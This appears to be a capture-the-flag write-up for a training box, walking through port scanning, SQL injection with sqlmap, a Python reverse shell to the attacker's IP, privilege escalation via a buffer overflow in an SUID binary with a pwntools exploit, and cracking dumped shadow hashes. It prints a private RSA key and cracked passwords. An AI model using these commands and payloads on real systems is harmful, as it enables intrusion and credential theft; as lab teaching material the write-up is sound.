# The Code Caper

## Overview


```sh
export IP=10.10.246.185
```


### PART 1 - Host Enumeration
Run **nmap** scan first:
```sh
nmap -p- -sC -oA ./nmap/fullportscan $IP
```

This one worked better if you want to scan for all ports:
```sh
nmap -p- -sC -A $IP
```

**http title:**
Apache2 Ubuntu Default Page: It works

**ssh version:**
OpenSSH 7.2p2 Ubuntu 4ubuntu2.8

**Version of the webserver:**
Apache/2.4.18



### PART 2 - Web Enumeration
Start with a gobuster enumeration:
```sh
gobuster dir -u http://$IP -w big.txt -o gobusterscan -x .txt,.php
```

here is a cheat sheet with some examples:
https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/

Downloaded big.txt with:
`wget "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/big.txt"`

Found these directories on the server:
```sh
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.php (Status: 403)
/administrator.php (Status: 200)
```
The only one accessable is `administrator.php` and it is the answer for part 2


### PART 3 - Web Exploitation

We first try credentials `admin:admin` and some other basic ones, and find nothing.
The hint here is to use sqlmap:

```sh
sqlmap -u 10.10.246.185/administrator.php --forms --dump
```

Outputted this:

```sh
Database: users
Table: users
[1 entry]
+----------+------------+
| username | password   |
+----------+------------+
| pingudad | secretpass |
+----------+------------+
```

`--forms` = Automatically selects parameters from <form> elements on the page
`-a` = Dump everything from the database
`--dump` = Used to retrieve data from the db once SQLI is found


### PART 4 - Command Execution

We set up a listener on our own machine:
```sh
nc -lnvp 9001
```

Then we use the python reverse shell from pentestmonkey:
```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.33.116",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

The listener will catch it, and we get a reverse shell back. We can stabelize it with the following commands:
```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```
Found a private rsa key in the ssh directory inder the user pengu:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArfwVtcBusqBrJ02SfHLEcpbFcrxUVFezLYEUUFTHRnTwUnsU
aHa3onWWNQKVoOwtr3iaqsandQoNDAaUNocbxnNoJaIAg40G2FEI49wW1Xc9porU
x8haIBCI3LSjBd7GDhyh4T6+o5K8jDfXmNElyp7d5CqPRQHNcSi8lw9pvFqaxUuB
ZYD7XeIR8i08IdivdH2hHaFR32u3hWqcQNWpmyYx4JhdYRdgdlc6U02ahCYhyvYe
LKIgaqWxUjkOOXRyTBXen/A+J9cnwuM3Njx+QhDo6sV7PDBIMx+4SBZ2nKHKFjzY
y2RxhNkZGvL0N14g3udz/qLQFWPICOw218ybaQIDAQABAoIBAClvd9wpUDPKcLqT
hueMjaycq7l/kLXljQ6xRx06k5r8DqAWH+4hF+rhBjzpuKjylo7LskoptYfyNNlA
V9wEoWDJ62vLAURTOeYapntd1zJPi6c2OSa7WHt6dJ3bh1fGjnSd7Q+v2ccrEyxx
wC7s4Is4+q90U1qj60Gf6gov6YapyLHM/yolmZlXunwI3dasEh0uWFd91pAkVwTb
FtzCVthL+KXhB0PSQZQJlkxaOGQ7CDT+bAE43g/Yzl309UQSRLGRxIcEBHRZhTRS
M+jykCBRDJaYmu+hRAuowjRfBYg2xqvAZU9W8ZIkfNjoVE2i+KwVwxITjFZkkqMI
jgL0oAECgYEA3339Ynxj2SE5OfD4JRfCRHpeQOjVzm+6/8IWwHJXr7wl/j49s/Yw
3iemlwJA7XwtDVwxkxvsfHjJ0KvTrh+mjIyfhbyj9HjUCw+E3WZkUMhqefyBJD1v
tTxWWgw3DKaXHqePmu+srUGiVRIua4opyWxuOv0j0g3G17HhlYKL94ECgYEAx0qf
ltrdTUrwr8qRLAqUw8n1jxXbr0uPAmeS6XSXHDTE4It+yu3T606jWNIGblX9Vk1U
mcRk0uhuFIAG2RBdTXnP/4SNUD0FDgo+EXX8xNmMgOm4cJQBdxDRzQa16zhdnZ0C
xrg4V5lSmZA6R38HXNeqcSsdIdHM0LlE31cL1+kCgYBTtLqMgo5bKqhmXSxzqBxo
zXQz14EM2qgtVqJy3eCdv1hzixhNKO5QpoUslfl/eTzefiNLN/AxBoSAFXspAk28
4oZ07pxx2jeBFQTsb4cvAoFuwvYTfrcyKDEndN/Bazu6jYOpwg7orWaBelfMi2jv
Oh9nFJyv9dz9uHAHMWf/AQKBgFh/DKsCeW8PLh4Bx8FU2Yavsfld7XXECbc5owVE
Hq4JyLsldqJKReahvut8KBrq2FpwcHbvvQ3i5K75wxC0sZnr069VfyL4VbxMVA+Q
4zPOnxPHtX1YW+Yxc9ileDcBiqCozkjMGUjc7s7+OsLw56YUpr0mNgOElHzDKJA8
qSexAoGAD4je4calnfcBFzKYkLqW3nfGIuC/4oCscYyhsmSySz5MeLpgx2OV9jpy
t2T6oJZYnYYwiZVTZWoEwKxUnwX/ZN73RRq/mBX7pbwOBBoINejrMPiA1FRo/AY3
pOq0JjdnM+KJtB4ae8UazL0cSJ52GYbsNABrcGEZg6m5pDJD3MM=
-----END RSA PRIVATE KEY-----
```

We can use this to log into his account.
That did not seem to work and I spent a lot of time trying to find this ssh password.
I tried using ssh2john with the pub file, but there was no password present in that private key, and I could not log into the pingu account with it either.
So finally i tried to use find on the www-data user instead of the pingu user, and on the bottom i found a file called `pass` stored in `/var/hidden`
We cat it out and find the ssh password for the pingu user.

`pingu:pinguapingu`

used the `find` command:
```sh
find / -user $USERNAME
```

### PART 5 - LinEnum

Transfered Linpeas.sh from our machine to the target using python:

On our machine:
```sh
python3 -m http.server
```

On the victim:
```sh
wget "http://$IP/linpeas.sh"
chmod +x linpeas
./linpeas.sh | tee linpeas.txt
```

Under the SUID category we see a very interesting file called `root`
It is an binary ELF executable.

`/opt/secret/root`


### PART 6 - PWNdbg

Here we are going to analyse the binary we found in the `/opt/secret/` directory.
Pingu did recover the source code of the file from his dad's flashdrive:
```c
#include "unistd.h"
#include "stdio.h"
#include "stdlib.h"
void shell(){
setuid(1000);
setgid(1000);
system("cat /var/backups/shadow.bak");
}

void get_input(){
char buffer[32];
scanf("%s",buffer);
}

int main(){
get_input();
}
```

For the given task we use gdb to analyse the binary and try to exploit it.
We start by running the following command:
`gdb /opt/secret/root`

Then from the source code we see that it is vulnerable to a buffer overflow.
So in order to analyze the overflow we cycle through with a bunch of shit input:
`r < <(cyclic 50)`

This will generate a bunch of nonsese in four bit cycles, sending in aaaaaaabaaacaaadaaaf...
Until it gets a segmentsation fault. From the output of gdb, we can see that it stops at the address 0x6161616c.
So in order to be able to overrite the EIP (instruction pointer) we have to find out exactly how many characters we need to get to that address.
Here is the bottom line of the output of the gdb cycle function showing the address:
` ► f 0 6161616c`

Then we use the cyclic -l flag in order to see how many characters it passed before it reached a specific address:
`cyclic -l 0x6161616c`
Outputs:
`44`

So it is 44 characters to cause the segmentation fault. We could test that by running the binary and passing in 44 characters.
Can use python to create a 44 long string:
```python
print ("A"*44)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Not lets run the file with this input:
```sh
./root
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

If we try the same with 43 'A' characters we wont get the same segment fault.
So we found the sweet-spot where it causes an error, and now we can execute whatever part of the program we want.


### PART 7 - Binary-Exploitaion: Manually

We can see in the source code that the program is calling a command called `shell()` which cats the output of /etc/shadow.bak
So the next step is to make the instruction pointer (EIP) point to the `shell()` function address. To find this we do the following:

```sh
info functions
disassemble shell
```

the first command will list all the functions being called in the binary.
The disassebmle command will disassemble the specified function so we can see the addresses and what it does in assebmly.
The output is as follows:
```sh
Dump of assembler code for function shell:
   0x080484cb <+0>:     push   ebp
   0x080484cc <+1>:     mov    ebp,esp
   0x080484ce <+3>:     sub    esp,0x8
   0x080484d1 <+6>:     sub    esp,0xc
   0x080484d4 <+9>:     push   0x3e8
   0x080484d9 <+14>:    call   0x80483a0 <setuid@plt>
   0x080484de <+19>:    add    esp,0x10
   0x080484e1 <+22>:    sub    esp,0xc
   0x080484e4 <+25>:    push   0x3e8
   0x080484e9 <+30>:    call   0x8048370 <setgid@plt>
   0x080484ee <+35>:    add    esp,0x10
   0x080484f1 <+38>:    sub    esp,0xc
   0x080484f4 <+41>:    push   0x80485d0
   0x080484f9 <+46>:    call   0x8048380 <system@plt>
   0x080484fe <+51>:    add    esp,0x10
   0x08048501 <+54>:    nop
   0x08048502 <+55>:    leave
   0x08048503 <+56>:    ret
End of assembler dump.
```

Here we can see that the function starts at 0x080484cb.
So if we provides it 44 characters of bullshit, and then point it to this address we could run that function!
This CPU architecture is "little endian", meaning bytes are backwards, making the address `cb840408`.
So now we have a functional payload, and we use python to make it:

```python
print("A"*44 + "\xcb\x84\x04\x08")
```

Then we have to use a `python -c` in bash in order to do this directly in our bash shell, and then we pipe that output to the binary:

```bash
python -c 'print("A"*44 + "\xcb\x84\x04\x08")' | ./root
```

This will call the `shell()` function, and will print the shadows file.
The shadowfile contains a hash of all the passwords for each usser on the box:

- `root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.`
- `papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.`


### PART 8 - Binary Exploitation: The pwntools way

This step explains how you can do the same thing using `pwntools` in python.
Here is the script that will do the same thing as we just did manually:

```python
from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
payload = fit({
44: shell_func # this adds the value of shell_func after 44 characters
})
proc.sendline(payload)
proc.interactive()
```

`process` - Set up a process with a given binary
`ELF` - Will obtain the memeory address of the functions in the binary
`fit` - fit will form a payload by combining characters and our memory address
`proc.sendline()` - will send the current payload we created
`proc.interactive()` - allows us to see the output of what happened


### PART 9 - Finishing the job

We are recomended to use **hashcat** in order to complete this task.
Recomended wordlist is `rockyou.txt`.
Here is the root hash:
`root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.`

From this [link](https://hashcat.net/wiki/doku.php?id=example_hashes) we can see the different modes.
Its either mode 500 or 1800 as we compare the hash with the table in the link.

```sh
hashcat -a 0 -m 500 password.hash /usr/share/wordlists/rockyou.txt --force
```
Here are the following flags we used:
- `-a` Specify attack mode,attack modes can be found in the man page. 0 for a wordlist attack
- `-m` Specifies which mode to use, refer back to the list of modes. 1800 for the specified hash from the table in the link above. Refers to sha512crypt $6$, SHA512 (Unix)
- `--force` To ignore warnings. Had some hardware warnings because of the VM



Instead of using hashcat I personally like **johntheripper** better. So I will try to do it with john:
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt password.hash
```

In the password.hash file I copied everything from the shadow file, so it looks like this:
`root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::`
john will automatically know what kind of hash type it is and that `root` is the username.

The output ended up with:
```sh
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
love2fish        (root)
1g 0:00:01:12 DONE (2020-09-25 09:48) 0.01379g/s 3309p/s 3309c/s 3309C/s lucinha..lospollitos
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

So we found the root password to be:
`root:love2fish`

Can also do the same with the papa user just for the fun of it:
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt papa.hash
```

```sh
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
postman          (papa)
1g 0:00:00:00 DONE (2020-09-25 09:52) 7.142g/s 154971p/s 154971c/s 154971C/s 151088..forbes
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

So finally we found the papa password to be:
`root:postman`
